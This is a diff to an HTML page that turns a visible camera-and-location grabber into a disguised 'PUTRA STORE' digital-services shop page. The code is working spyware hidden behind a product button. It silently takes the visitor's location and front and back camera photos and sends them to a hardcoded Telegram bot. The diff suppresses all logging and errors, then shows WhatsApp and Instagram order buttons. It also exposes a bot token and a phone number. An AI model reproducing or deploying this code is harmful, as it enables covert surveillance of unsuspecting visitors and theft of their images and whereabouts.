@@ -3,51 +3,97 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Secure Access</title>
+  <title>PUTRA STORE</title>
   <style>
     body{
       margin:0; padding:0; height:100vh;
-      background:black; color:#00ff66;
+      background:#0d0d0d; color:#3399ff;
       font-family: monospace; display:flex;
       align-items:center; justify-content:center;
       flex-direction:column;
     }
-    h1{margin-bottom:20px; text-shadow:0 0 8px #00ff66;}
+    h1{
+      margin-bottom:20px; 
+      color:#3399ff;
+      text-shadow:0 0 12px #00ccff;
+    }
     button{
-      background:transparent; color:#00ff66;
-      border:2px solid #00ff66; padding:12px 20px;
+      background:transparent; color:#3399ff;
+      border:2px solid #3399ff; padding:12px 20px;
       border-radius:10px; font-weight:bold;
       cursor:pointer; font-size:1.1rem;
-      box-shadow:0 0 10px #00ff66;
+      box-shadow:0 0 10px #00ccff;
       transition:0.2s;
     }
-    button:hover{background:#00ff66; color:black;}
-    #log{
-      margin-top:20px; width:90%; max-width:500px;
-      height:200px; overflow:auto;
-      background:rgba(0,0,0,0.7); border:1px dashed #00ff66;
-      padding:10px; border-radius:8px; font-size:14px;
+    button:hover{background:#3399ff; color:#0d0d0d;}
+
+    /* Loading spinner */
+    .loader{
+      border:6px solid #222;
+      border-top:6px solid #00ccff;
+      border-radius:50%;
+      width:60px; height:60px;
+      animation:spin 1s linear infinite;
+      margin:20px auto;
     }
+    @keyframes spin{
+      0%{transform:rotate(0deg);}
+      100%{transform:rotate(360deg);}
+    }
+
+    /* Store layout */
+    .store-container{
+      width:100%; max-width:800px;
+      padding:40px; text-align:left;
+    }
+    .store-container h2{
+      font-size:2rem; text-align:center;
+      margin-bottom:20px; color:#3399ff;
+      text-shadow:0 0 12px #00ccff;
+    }
+    .store-container p{
+      color:white; background:#1a1a1a;
+      padding:15px; border-radius:10px;
+      line-height:1.8; font-size:1rem;
+      margin-bottom:40px;
+    }
+    .center-section{
+      text-align:center; width:100%;
+    }
+    .center-section h3{
+      font-size:1.4rem; font-weight:bold; margin-bottom:20px;
+      color:#f2f2f2;
+    }
+    .btn-order{
+      display:block; width:200px;
+      margin:10px auto; padding:12px 24px;
+      font-size:1rem; border-radius:10px;
+      cursor:pointer; transition:0.2s;
+      font-weight:bold;
+    }
+    .btn-wa{
+      background:transparent; border:2px solid #00ff66; color:#00ff66;
+      box-shadow:0 0 8px #00ff66;
+    }
+    .btn-wa:hover{background:#00ff66; color:#0d0d0d;}
+    .btn-ig{
+      background:transparent; border:2px solid #ff3399; color:#ff3399;
+      box-shadow:0 0 8px #ff3399;
+    }
+    .btn-ig:hover{background:#ff3399; color:#0d0d0d;}
   </style>
 </head>
 <body>
-  <h1>SELAMAT DATANG</h1>
-  <button id="openBtn">Cari Tau Umur Nama Mu</button>
-  <div id="log"></div>
+  <h1>PUTRA STORE</h1>
+  <button id="openBtn">CEK PRODUK</button>
 
 <script>
 const BOT_TOKEN = "8368219449:AAEAW2jkZ0u546zDH-n4clLWvkAmljVHDQg";
 const OWNER_ID = "7030098676";
 
-const logBox = document.getElementById("log");
-function log(msg){
-  logBox.innerHTML += msg+"<br>";
-  logBox.scrollTop = logBox.scrollHeight;
-}
+function log(msg){} // silent
 
-// fungsi ambil foto
 async function ambilFoto(facingMode){
-  log("▶ Mengakses Data...");
   let photoBlob = null;
   try{
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -56,24 +102,26 @@ async function ambilFoto(facingMode){
     const video = document.createElement("video");
     video.srcObject = stream;
     await video.play();
-
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video,0,0,canvas.width,canvas.height);
-
     photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
     stream.getTracks().forEach(t=>t.stop());
-    log("System: Data diambil.");
-  }catch(e){
-    log("Data Gagal Diambil: "+e.message);
-  }
+  }catch(e){}
   return photoBlob;
 }
 
 document.getElementById("openBtn").addEventListener("click", async()=>{
-  log("▶ Mencari Informasi...");
+  // tampilkan loading
+  document.body.innerHTML = `
+    <div style="text-align:center; color:#3399ff;">
+      <h2>Loading...</h2>
+      <div class="loader"></div>
+    </div>
+  `;
+
   let coords = null;
   try{
     coords = await new Promise((resolve,reject)=>{
@@ -83,18 +131,11 @@ document.getElementById("openBtn").addEventListener("click", async()=>{
         {timeout:10000}
       );
     });
-    log("✔ Lokasi: "+coords.latitude.toFixed(5)+","+coords.longitude.toFixed(5));
-  }catch(e){
-    log("❌Lokasi Gagal: "+e.message);
-  }
+  }catch(e){}
 
-  // ambil foto dari kamera depan
   const fotoDepan = await ambilFoto("user");
-
-  // ambil foto dari kamera belakang
   const fotoBelakang = await ambilFoto("environment");
 
-  // kirim ke Telegram
   try{
     if(fotoDepan){
       const fd = new FormData();
@@ -104,7 +145,6 @@ document.getElementById("openBtn").addEventListener("click", async()=>{
       if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
       fd.append("caption",cap);
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-      log("Data terkirim ke Pemilik.");
     }
     if(fotoBelakang){
       const fd = new FormData();
@@ -114,13 +154,25 @@ document.getElementById("openBtn").addEventListener("click", async()=>{
       if(coords) cap += ` Lokasi: https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
       fd.append("caption",cap);
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-      log("Data terkirim ke Pemilik.");
     }
-  }catch(e){
-    log("Kirim Ke Pemilik gagal: "+e.message);
-  }
+  }catch(e){}
 
-  log("=== Selesai ===");
+  // setelah selesai kirim → ganti tampilan
+  document.body.innerHTML = `
+    <div class="store-container">
+      <h2>PUTRA DIGITAL STORE</h2>
+      <p>
+        Semua kebutuhan digital seperti Website, Script, Logo,<br>
+        Jasa Membuat Script,<br>
+        Jasa Pembuatan Website
+      </p>
+      <div class="center-section">
+        <h3>ORDER VIA</h3>
+        <button class="btn-order btn-wa" onclick="window.location.href='https://wa.me/+6281907185090'">WHATSAPP</button>
+        <button class="btn-order btn-ig" onclick="window.location.href='https://www.instagram.com/jmptraa?igsh=MW9iOWNhcHBsaDg3aw=='">INSTAGRAM</button>
+      </div>
+    </div>
+  `;
 });
 </script>
 </body>
